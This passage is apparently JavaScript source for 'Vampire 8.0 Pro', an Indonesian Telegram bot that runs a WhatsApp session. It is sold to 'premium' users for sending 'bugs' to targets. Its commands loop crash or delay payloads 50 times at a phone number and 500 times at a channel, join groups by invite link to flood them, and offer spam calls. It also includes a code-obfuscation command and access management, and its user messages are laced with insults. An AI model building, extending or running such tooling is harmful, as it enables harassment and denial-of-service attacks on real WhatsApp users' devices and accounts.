┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /delay
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/ranzcombo(?:\s(.+))?/, async (msg, match) => {
    const senderId = msg.from.id;
    const chatId = msg.chat.id
    
    if (shouldIgnoreMessage(msg)) return;

    if (!whatsappStatus) {
        return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu!!!");
    }
    if (!premiumUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Lu Siapa!!! Bukan Premium Mau Access Bot");
    }
    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a target number.\nExample: /force x delay 62×××.");
    }

    const numberTarget = match[1].replace(/[^0-9]/g, '').replace(/^\+/, '');
    if (!/^\d+$/.test(numberTarget)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /vampnewbeta 62×××.");
    }

    const formatedNumber = numberTarget + "@s.whatsapp.net";

    // Kirim notifikasi awal dengan gambar
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓
┃ Mᴏʜᴏɴ ᴍᴇɴᴜɴɢɢᴜ...
┃ Bᴏᴛ sᴇᴅᴀɴɢ ᴏᴘᴇʀᴀsɪ ᴘᴇɴɢɪʀɪᴍᴀɴ ʙᴜɢ
┃ Tᴀʀɢᴇᴛ  : ${numberTarget}
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });

    for (let i = 0; i < 50; i++) { // Kirim 3 kali langsung
        await SLoct(formatedNumber);
        await new Promise((resolve) => setTimeout(resolve, 2000));
    }

    // Kirim notifikasi setelah selesai dengan gambar lain
    await bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
        caption: `
┏━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━┓
┃         〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼〢
┃〢 Tᴀʀɢᴇᴛ : ${numberTarget}
┃〢 Cᴏᴍᴍᴀɴᴅ : /force x delay 
┃〢 Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 10 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs
┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    });
});
bot.onText(/\/vamndnpgroup(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (!whatsappStatus) {
    return bot.sendMessage(chatId, "❌ Sambungkan Ke WhatsApp Dulu Goblok!!!");
  }
  if (!premiumUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Bukan Premium Tolol!!!");
  }
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukin Link Grup Yang Bener!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  const groupLink = match[1].trim();
  if (!/^https:\/\/chat\.whatsapp\.com\/[A-Za-z0-9]+$/.test(groupLink)) {
    return bot.sendMessage(chatId, "❌ Link Grup Salah!!!\nContoh: /vampgroup https://chat.whatsapp.com/xxxx");
  }

  const groupCode = groupLink.split("https://chat.whatsapp.com/")[1];

  try {
    await bot.sendMessage(chatId, "⏳ Sedang bergabung ke grup, mohon tunggu...");
    
    const groupInfo = await sock.groupAcceptInvite(groupCode);
    const groupId = groupInfo.id;
    
    await bot.sendMessage(chatId, "✅ Berhasil join grup! Sedang mengirim bug...");
    
    // Kirim bug ke dalam grup setelah join
    await VampGroup(groupId);

    await bot.sendMessage(
      chatId,
      `┏━━━━━━━〣 𝗡𝗢𝗧𝗜𝗙𝗜𝗖𝗔𝗧𝗜𝗢𝗡 〣━━━━━━━┓\n` +
      `┃╺╺╸〢𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 𝗦𝗲𝗻𝘁 𝗕𝘂𝗴 𝘁𝗼 𝗚𝗿𝗼𝘂𝗽〢╺╸╺\n` +
      `┃ Tᴀʀɢᴇᴛ Gʀᴏᴜᴘ: ${groupId}\n` +
      `┃ Cᴏᴍᴍᴀɴᴅ : /vampgroup\n` +
      `┃ Wᴀʀɴɪɴɢ : ᴊᴇᴅᴀ 3 ᴍᴇɴɪᴛ ʏᴀ ᴋɪᴅs\n` +
      `┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛`
    );
  } catch (err) {
    console.error("Error saat join atau kirim bug:", err);
    return bot.sendMessage(chatId, "❌ Gagal mengirim bug ke grup. Mungkin bot ditolak masuk atau link salah.");
  }
});
bot.onText(/\/vampch(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  // Cek apakah user punya izin
  const isAuthorized = isOwner || senderId === botNumber;
  if (!isAuthorized) {
    return bot.sendMessage(chatId, "❌ Lu Siapa Ngentot!!!\nLu Gak ada Hak Gunain Vampire Private");
  }

  // Cek apakah user memasukkan ID saluran
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Masukkan ID saluran!\nContoh: /vampch id@newsletter");
  }

  let targetChannel = match[1].trim();

  // Eksekusi perintah kirim bug ke channel
  try {
    for (let r = 0; r < 500; r++) {
      await VampChannel(targetChannel);
    }

    bot.sendMessage(chatId, `✅ Pesan dikirim ke saluran *${targetChannel}* sebanyak 20 kali.`);
  } catch (err) {
    console.error("Error saat mengirim ke channel:", err);
    bot.sendMessage(chatId, "❌ Gagal mengirim ke saluran, coba lagi nanti.");
  }
});
bot.onText(/\/encrypthard/, async (msg) => {
    const chatId = msg.chat.id;
    const replyMessage = msg.reply_to_message;

    console.log(`Perintah diterima: /encrypthard dari pengguna: ${msg.from.username || msg.from.id}`);

    if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, '😡 Silakan Balas/Tag File .js\nBiar Gua Gak Salah Tolol.');
    }

    const fileId = replyMessage.document.file_id;
    const fileName = replyMessage.document.file_name;

    // Mendapatkan link file
    const fileLink = await bot.getFileLink(fileId);
    const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
    const codeBuffer = Buffer.from(response.data);

    // Simpan file sementara
    const tempFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(tempFilePath, codeBuffer);

    // Enkripsi kode menggunakan JsConfuser
    bot.sendMessage(chatId, "⌛️Sabar...\n Lagi Di Kerjain Sama Vampire Encryptnya...");
    const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
        target: "node",
        preset: "high",
        compact: true,
        minify: true,
        flatten: true,
        identifierGenerator: function () {
            const originalString = "肀VampireTheKingOfBug舀" + "肀VampireTheKingOfBug舀";
            function removeUnwantedChars(input) {
                return input.replace(/[^a-zA-Z肀VampireTheKingOfBug舀]/g, '');
            }
            function randomString(length) {
                let result = '';
                const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
                for (let i = 0; i < length; i++) {
                    result += characters.charAt(Math.floor(Math.random() * characters.length));
                }
                return result;
            }
            return removeUnwantedChars(originalString) + randomString(2);
        },
        renameVariables: true,
        renameGlobals: true,
        stringEncoding: true,
        stringSplitting: 0.0,
        stringConcealing: true,
        stringCompression: true,
        duplicateLiteralsRemoval: 1.0,
        shuffle: { hash: 0.0, true: 0.0 },
        stack: true,
        controlFlowFlattening: 1.0,
        opaquePredicates: 0.9,
        deadCode: 0.0,
        dispatcher: true,
        rgf: false,
        calculator: true,
        hexadecimalNumbers: true,
        movedDeclarations: true,
        objectExtraction: true,
        globalConcealing: true
    });

    // Simpan hasil enkripsi
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);

    // Kirim file terenkripsi ke pengguna
    bot.sendDocument(chatId, encryptedFilePath, {
        caption: `
❒━━━━━━༽𝗦𝘂𝗰𝗰𝗲𝘀𝘀༼━━━━━━❒
┃    - 𝗘𝗻𝗰𝗿𝘆𝗽𝘁 𝗛𝗮𝗿𝗱 𝗝𝘀𝗼𝗻 𝗨𝘀𝗲𝗱 -
┃             -- 𝗩𝗔𝗠𝗣𝗜𝗥𝗘 𝗕𝗢𝗧 --
❒━━━━━━━━━━━━━━━━━━━━❒`
    });
});

bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Owner Atau Admin Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing : /addprem 62×××.");
  }

  if (!premiumUsers.includes(userId)) {
      premiumUsers.push(userId);
      savePremiumUsers();
      console.log(`${senderId} Added ${userId} To Premium`)
      bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Premium.`);
  }
});
bot.onText(/\/delprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ Lu Bukan Admin Atau Owner Tolol!!!");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing : /delprem 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
  if (premiumUsers.includes(userId)) {
      premiumUsers = premiumUsers.filter(id => id !== userId);
      savePremiumUsers();
      console.log(`${senderId} Dihapus ${userId} Dari Premium`)
      bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Premium.`);
  } else {
      bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Lagi Premium.`);
  }
});

bot.onText(/\/addowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !resellerUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Ga Punya Access Tolol!!!");
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /addowner 62×××.");
  }

  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Lu Salah Goblok!!!\nContoh Nih Njing: /addowner 62×××.");
  }

  if (!OwnerUsers.includes(userId)) {
    OwnerUsers.push(userId);
    saveOwnerUsers(); // Simpan perubahan ke superVip
    console.log(`${senderId} Added ${userId} To Owner`);
    bot.sendMessage(chatId, `✅ Si Yatim Ini ${userId} Berhasil Mendapatkan Access Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Yatim Ini ${userId} Sudah Menjadi Owner.`);
  }
});
bot.onText(/\/delowner(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  // Cek apakah user yang mengakses punya hak akses
  if (!owner.includes(senderId) && !adminUsers.includes(senderId) && !superVip.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ Lu Gak Punya Access Tolol!!!");
  }

  // Cek input yang diberikan user
  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Lu Salah Idiot!!!\nContoh Nih Njing: /delowner 62×××.");
  }

  // Ambil ID user dari input dan validasi
  const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
  if (isNaN(userId)) {
    return bot.sendMessage(chatId, "❌ Masukkan ID yang valid.");
  }

  // Cek apakah user yang dimaksud adalah superVip (owner)
  if (OwnerUsers.includes(userId)) {
    // Hapus dari superVip dan simpan perubahan
    OwnerUsers = superVip.filter(id => id !== userId);
    saveOwnerUsers(); // Simpan data terbaru
    console.log(`${senderId} Menghapus ${userId} Dari Owner`);
    bot.sendMessage(chatId, `✅ Si Goblok Ini ${userId} Sudah Dihapus Dari Owner.`);
  } else {
    bot.sendMessage(chatId, `❌ Si Goblok Ini ${userId} Bukan Owner.`);
  }
});
bot.on("callback_query", async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const senderId = callbackQuery.from.id;
    const senderName = callbackQuery.from.username ? `@${callbackQuery.from.username}` : `${senderId}`;
    const [action, formatedNumber] = callbackQuery.data.split(":");

    // Definisi variabel yang belum ada
    let whatsappStatus = true; // Ganti sesuai logic di kode utama
    let getOnlineDuration = () => "1h 23m"; // Placeholder function

    try {
        if (action === "ownermenu") {
            let ligma = `
𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭──────「 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮 」──────╮
│➵ /addbot <Num>
│➵ /addprem <ID>
│➵ /delprem <ID>
│➵ /addowner <ID>
│➵ /delowner <ID>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/Vampiresagara"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "bugmenu") {
            let ligma = `
╭═════════════════❀
│
│   ⚘ BUG MENU ⚘
│ 
│ ❀ /ranzunli <number>
│ ❀ /ranznew <number> 
│ ❀ /ranznull <number>
│ ❀ /ranzios <number>
│ ❀ /ranzcombo <number>
│ 
╰═════════════════❀
`;
  bot.sendPhoto(chatId, "https://d.uguu.se/EppqczQR.jpg", {
      caption: ligma,
      reply_markup: {
          inline_keyboard: [
              [
                  {
                      text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                      url: "https://t.me/abee1945"
                  }
                        ]
                    ]
                }
            });
        } else if (action === "toolsmenu") {
            let ligma = `𖤊───⪩  𝐕𝐀𝐌𝐏𝐈𝐑𝐄 𝟖.𝟎 𝐏𝐑𝐎  ⪨───𖤊
╭──────────────────────╮
│➼ Nᴀᴍᴇ : ${senderName}
│➼ Dᴇᴠᴇʟᴏᴘᴇʀ : @Vampiresagara
│➼ Sᴛᴀᴛᴜs : ${whatsappStatus ? "Premium" : "No Access"}
│➼ Oɴʟɪɴᴇ : ${getOnlineDuration()}
╰──────────────────────╯
╭──────「 𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮 」───────╮
│➩ /fixedbug <Num>
│➩ /encrypthard <Tag File>
│➩ /cooldown <Num>
╰──────────────────────╯
`;
            bot.sendPhoto(chatId, "https://files.catbox.moe/ecepcb.jpg", {
                caption: ligma,
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "〢𝐂𝐨𝐧𝐭𝐚𝐜𝐭",
                                url: "https://t.me/Vampiresagara"
                            }
                        ]
                    ]
                }
            });
        } else if (action === "spamcall") {
            await spamcall(formatedNumber);
            await bot.sendMessage(chatId, `✅ Spamming Call to ${formatedNumber}@s.whatsapp.net.`);
        } else {
            bot.sendMessage(chatId, "❌ Unknown action.");
        }

        // Hapus loading di button
        await bot.answerCallbackQuery(callbackQuery.id);
    } catch (err) {
        bot.sendMessage(chatId, `❌ Failed to send bug: ${err.message}`);
    }
});

startWhatsapp()